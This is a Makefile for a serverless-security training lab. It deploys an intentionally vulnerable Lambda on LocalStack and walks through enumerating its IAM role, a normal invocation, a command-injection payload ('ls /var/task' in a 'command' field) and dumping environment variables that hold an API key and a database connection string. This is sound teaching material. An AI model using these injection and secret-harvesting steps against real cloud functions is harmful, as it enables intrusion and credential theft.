# Module 09 — Serverless Security
# Standard targets: up / down / reset / demo / shell
.PHONY: up down reset demo shell enumerate invoke inject

up:          ## Build containers, start LocalStack, and deploy the vulnerable Lambda
	docker compose up -d --build
	@echo "Waiting for LocalStack..."
	@docker compose exec lab bash -c '\
		until curl -sf http://localstack:4566/_localstack/health | grep -q "\"lambda\""; \
		do sleep 2; done'
	docker compose run --rm lab bash data/setup.sh

down:        ## Stop and remove containers
	docker compose down

reset:       ## Full teardown
	docker compose down --rmi local --volumes --remove-orphans

shell:       ## Open a shell in the lab container
	docker compose exec lab bash

enumerate:   ## Run cloudfox to enumerate Lambda permissions
	docker compose run --rm lab sh -c '\
		echo "=== Lambda functions ==="; \
		awslocal lambda list-functions --query "Functions[*].[FunctionName,Role]" --output table; \
		echo ""; \
		echo "=== Role policies ==="; \
		awslocal iam list-role-policies --role-name meridian-notifier-role; \
		echo ""; \
		echo "=== Inline policy ==="; \
		awslocal iam get-role-policy \
			--role-name meridian-notifier-role \
			--policy-name MeridianNotifierPolicy | jq .PolicyDocument'

invoke:      ## Invoke the Lambda with a normal payload
	docker compose run --rm lab sh -c '\
		awslocal lambda invoke \
			--function-name meridian-notifier \
			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
			/tmp/response.json && cat /tmp/response.json | jq .'

inject:      ## Invoke with injection payload — shows command output in response
	docker compose run --rm lab sh -c '\
		echo "Sending injection payload..."; \
		awslocal lambda invoke \
			--function-name meridian-notifier \
			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
			/tmp/inject-response.json && \
		jq -r ".body" /tmp/inject-response.json | jq .command_output'

demo:        ## Full worked demo: enumerate → normal invoke → injection
	@echo "== 1. List Lambda functions =="
	docker compose run --rm lab awslocal lambda list-functions \
		--query "Functions[*].[FunctionName,Runtime,Role]" \
		--output table
	@echo ""
	@echo "== 2. Inspect over-privileged role =="
	docker compose run --rm lab sh -c '\
		awslocal iam get-role-policy \
			--role-name meridian-notifier-role \
			--policy-name MeridianNotifierPolicy 2>/dev/null | jq .PolicyDocument.Statement[].Action'
	@echo ""
	@echo "== 3. Check environment variables (sensitive data in env) =="
	docker compose run --rm lab awslocal lambda get-function-configuration \
		--function-name meridian-notifier \
		--query "Environment.Variables" --output json
	@echo ""
	@echo "== 4. Normal invocation =="
	docker compose run --rm lab sh -c '\
		awslocal lambda invoke \
			--function-name meridian-notifier \
			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
			/tmp/demo-response.json && jq . /tmp/demo-response.json'
	@echo ""
	@echo "== 5. Injection: list function source files =="
	docker compose run --rm lab sh -c '\
		awslocal lambda invoke \
			--function-name meridian-notifier \
			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
			/tmp/inject.json && \
		echo "Response body:" && \
		jq -r ".body" /tmp/inject.json | jq .command_output 2>/dev/null || cat /tmp/inject.json'
	@echo ""
	@echo "== Finding summary =="
	@echo "1. Over-privileged role: s3:*, iam:*, sts:AssumeRole * (T1078)"
	@echo "2. Event injection: command field executed in subprocess (OWASP Serverless #1)"
	@echo "3. Env vars: MERIDIAN_API_KEY and DB_CONNECTION_STRING exposed (T1552)"
